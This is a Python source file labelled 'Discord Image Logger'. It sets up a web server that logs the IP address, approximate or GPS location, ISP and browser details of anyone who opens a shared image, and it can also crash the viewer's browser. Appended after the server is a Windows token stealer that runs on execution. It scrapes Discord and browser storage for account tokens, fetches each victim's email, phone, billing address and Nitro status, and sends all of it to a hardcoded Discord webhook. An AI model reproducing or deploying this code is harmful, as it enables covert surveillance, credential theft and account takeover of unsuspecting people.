# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444834031433945101/_C60nJJRN12PGspmz7uBiScc_EaxEAJV2AGHvZ2zTVJBaLLtQksGcaBbRfc8DEpUrL_e",
    "image": "https://www.pngall.com/wp-content/uploads/2016/07/Anime-PNG-Images.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI

WEBHOOK_URL = 'https://discord.com/api/webhooks/1444834031433945101/_C60nJJRN12PGspmz7uBiScc_EaxEAJV2AGHvZ2zTVJBaLLtQksGcaBbRfc8DEpUrL_e'

import os, json, re, urllib3, random
if os.name != "nt": exit()

from urllib.request import Request, urlopen
from requests import post, get
from datetime import datetime

user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20150626 Firefox/36.0',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_5) AppleWebKit/5342 (KHTML, like Gecko) Chrome/37.0.869.0 Mobile Safari/5342',
'Opera/8.11 (Windows NT 6.1; sl-SI) Presto/2.8.218 Version/12.00',
'Mozilla/5.0 (Macintosh; PPC Mac OS X 10_8_3 rv:6.0) Gecko/20130514 Firefox/36.0',
'Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Trident/4.1)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0 rv:4.0) Gecko/20180512 Firefox/35.0',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_4) AppleWebKit/5352 (KHTML, like Gecko) Chrome/40.0.820.0 Mobile Safari/5352',
'Opera/8.83 (X11; Linux x86_64; sl-SI) Presto/2.8.187 Version/11.00',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_3) AppleWebKit/5332 (KHTML, like Gecko) Chrome/40.0.829.0 Mobile Safari/5332',
'Opera/9.63 (X11; Linux x86_64; sl-SI) Presto/2.12.183 Version/12.00']
user_agent = random.choice(user_agents)

ip_address = get('http://checkip.amazonaws.com').content.decode('utf8')[:-2]

def GetTokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ldb = '\\Local Storage\\leveldb'
    paths = {
        'Discord': roaming + '\\Discord' ,
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
    }
    grabbed = {}
    token_ids = []
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        tokens = []
        for file_name in os.listdir(path + ldb):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path + ldb}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        if token in tokens:
                            pass
                        else:
                            response = post(f'https://discord.com/api/v6/invite/{random.randint(1,9999999)}', headers={'Authorization': token})
                            if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
                                pass
                            else:
                                tokenid = token[:24]
                                if tokenid in token_ids:
                                    pass
                                else:
                                    token_ids.append(tokenid)
                                    tokens.append(token)
        if len(tokens) > 0:
            grabbed[platform] = tokens
    return grabbed

def GetUsername(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()

    username = f'{info["username"]}#{info["discriminator"]}'
    return username


def GetUserId(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    userid = info['id']
    return userid

def GetEmail(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    email = info['email']
    return email

def GetPhoneNumber(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    phone_number = info['phone']
    return phone_number

def VerifiedCheck(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    verified = info['verified']
    verified = bool(verified)
    return verified

def BillingCheck(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
    print(info)
    if len(info) > 0:
        billing_info = []

        addr = info[0]['billing_address']

        name = addr['name']
        billing_info.append(name)

        address_1 = addr['line_1']
        billing_info.append(address_1)

        address_2 = addr['line_2']
        billing_info.append(address_2)

        city = addr['city']
        billing_info.append(city)

        postal_code = addr['postal_code']
        billing_info.append(postal_code)

        state = addr['state']
        billing_info.append(state)

        country = addr['country']
        billing_info.append(country)

        print(billing_info)

        return True, billing_info
    else:
        return False, info

def NitroCheck(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }


    has_nitro = False
    res = get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    if has_nitro:
        has_nitro = True
        end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((start - end).days)

        return has_nitro, start, end, days_left
    else:
        has_nitro = False
        return has_nitro, nitro_data

def GetLocale(token):
    languages = {
        'da'    : 'Danish, Denmark',
        'de'    : 'German, Germany',
        'en-GB' : 'English, United Kingdom',
        'en-US' : 'English, United States',
        'es-ES' : 'Spanish, Spain',
        'fr'    : 'French, France',
        'hr'    : 'Croatian, Croatia',
        'lt'    : 'Lithuanian, Lithuania',
        'hu'    : 'Hungarian, Hungary',
        'nl'    : 'Dutch, Netherlands',
        'no'    : 'Norwegian, Norway',
        'pl'    : 'Polish, Poland',
        'pt-BR' : 'Portuguese, Brazilian, Brazil',
        'ro'    : 'Romanian, Romania',
        'fi'    : 'Finnish, Finland',
        'sv-SE' : 'Swedish, Sweden',
        'vi'    : 'Vietnamese, Vietnam',
        'tr'    : 'Turkish, Turkey',
        'cs'    : 'Czech, Czechia, Czech Republic',
        'el'    : 'Greek, Greece',
        'bg'    : 'Bulgarian, Bulgaria',
        'ru'    : 'Russian, Russia',
        'uk'    : 'Ukranian, Ukraine',
        'th'    : 'Thai, Thailand',
        'zh-CN' : 'Chinese, China',
        'ja'    : 'Japanese',
        'zh-TW' : 'Chinese, Taiwan',
        'ko'    : 'Korean, Korea'
    }


    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    locale = info['locale']
    language = languages.get(locale)

    return locale, language




def SendTokens(webhook_url, tokens_grabbed = None):
    if not tokens_grabbed: tokens_grabbed = GetTokens()
    embed = [{'description' : ''}]
    tokens_info = []
    for app in list(tokens_grabbed.keys()):
        for token in tokens_grabbed[app]:
            tokens_info.append(token)
        embed[0]['description'] += f'\n```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(tokens_grabbed[app]) + '\n```'
    
    for token in tokens_info:
        
        username       = GetUsername(token)
        user_id        = GetUserId(token)
        email          = GetEmail(token)
        phone_number   = GetPhoneNumber(token)
        verified_check = VerifiedCheck(token)
        billing        = BillingCheck(token)[0]
        billing_info   = BillingCheck(token)[1]
        nitro          = NitroCheck(token)[0]
        locale         = GetLocale(token)[0]
        language       = GetLocale(token)[1]
        

        embed[0]['description'] += f'\n```diff\n+ Token Info for\n{token}\n\n'

        embed[0]['description'] += f'''Username   = {username}
User Id    = {user_id}
Ip Address = {ip_address}
Email      = {email}
Phone      = {phone_number}
Verified   = {verified_check}
Billing    = {billing}
'''

        if billing == True:
            name        = billing_info[0]
            address_1   = billing_info[1]
            address_2   = billing_info[2]
            city        = billing_info[3]
            postal_code = billing_info[4]
            state       = billing_info[5]
            country     = billing_info[6]

            embed[0]['description'] += f'\nName           = {name}\nAddress Line 1 = {address_1}\nAddress Line 2 = {address_2}\nCity           = {city}\nPostal Code    = {postal_code}\nState          = {state}\nCountry        = {country}\n\n'

        embed[0]['description'] += f'''Nitro      = {nitro}
'''

        if nitro == True:
            nitrostart  = NitroCheck(token)[1]
            nitroend    = NitroCheck(token)[2]
            daysofnitro = NitroCheck(token)[3]
            embed[0]['description'] += f'\nNitro Started = {nitrostart}\nNitro Ends    = {nitroend}\nDays Left     = {daysofnitro}\n\n'

        embed[0]['description'] += f'''Locale     = {locale}
Language   = {language}'''


        embed[0]['description'] += '```'



    urlopen(Request(webhook_url, data=json.dumps({"embeds" : embed}).encode(), headers={'Content-Type': 'application/json','User-Agent': f'{user_agent}'}))


SendTokens(WEBHOOK_URL)
